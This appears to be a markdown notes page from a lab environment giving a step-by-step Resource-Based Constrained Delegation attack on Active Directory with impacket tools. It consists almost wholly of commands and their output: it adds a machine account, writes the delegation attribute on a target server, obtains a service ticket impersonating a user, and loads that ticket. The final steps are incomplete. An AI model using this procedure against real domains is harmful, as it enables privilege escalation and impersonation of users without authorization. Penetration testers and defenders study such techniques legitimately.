---
title: Resource Based Constrained Delegation
---




1. Create a computer account

    ```shell
    impacket-addcomputer alpha.lab/admjrice:'Welcome@123' -dc-ip 172.17.1.100 -method SAMR -computer-name 'computer1' -computer-pass 'Welcome@123'
    ```
    
    **Output**:
    
    ```
    [*] Successfully added machine account computer1$ with password Welcome@123.
    ```

2. Read the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

    ```shell
    impacket-rbcd alpha.lab/admjrice:'Welcome@123' -delegate-from 'computer1$' -delegate-to 'SRV1$' -action read -use-ldaps
    ```

    **Output**:

    ```
    [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
    ```

3. Write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

    ```shell
    impacket-rbcd alpha.lab/admjrice:'Welcome@123' -delegate-from 'computer1$' -delegate-to 'SRV1$' -action write -use-ldaps
    ```

    **Output**:

    ```shell
    [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
    [*] Delegation rights modified successfully!
    [*] computer1$ can now impersonate users on SRV1$ via S4U2Proxy
    [*] Accounts allowed to act on behalf of other identity:
    [*]     computer1$   (S-1-5-21-3126301996-1406783378-2546799489-1274)
    ```

4. Impersonate

    ```shell
    impacket-getST 'alpha.lab/computer1$:Welcome@123' -spn 'cifs/srv1.alpha.lab' -impersonate 'j.rice'
    ```

    **Output**:

    ```
    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [*] Impersonating j.rice
    [*] Requesting S4U2self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in j.rice@cifs_srv1.alpha.lab@ALPHA.LAB.ccache
    ```

5. 

    ```shell
    export KRB5CCNAME=j.rice@cifs_srv1.alpha.lab@ALPHA.LAB.ccache
    ```

6.  